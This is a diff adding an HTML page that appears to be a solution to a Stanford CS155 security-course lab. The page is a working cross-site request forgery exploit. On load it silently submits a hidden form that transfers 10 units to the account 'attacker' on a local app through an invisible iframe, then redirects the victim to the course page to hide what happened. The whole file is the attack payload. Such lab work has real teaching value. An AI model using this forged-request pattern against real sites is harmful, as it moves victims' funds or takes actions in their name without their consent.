@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset='utf-8'>
+        <script>
+            var hit=false;
+            function load(){
+                document.getElementById('csrf').submit();
+                hit=true;
+            }
+            function bye(){
+                if(hit){
+                    window.location.replace("http://crypto.stanford.edu/cs155");
+                }
+            }
+        </script>
+    </head>
+    <body onload="load()">
+        <form id="csrf" method="POST" target="iframe" action="http://localhost:3000/post_transfer">
+            <input name="destination_username" type="hidden" value="attacker">
+            <input name="quantity" type="hidden" value="10">
+        </form>
+        <iframe style="width:0; height:0; border:0; border:none" name="iframe" onload="bye()"></iframe>
+    </body>
+</html>
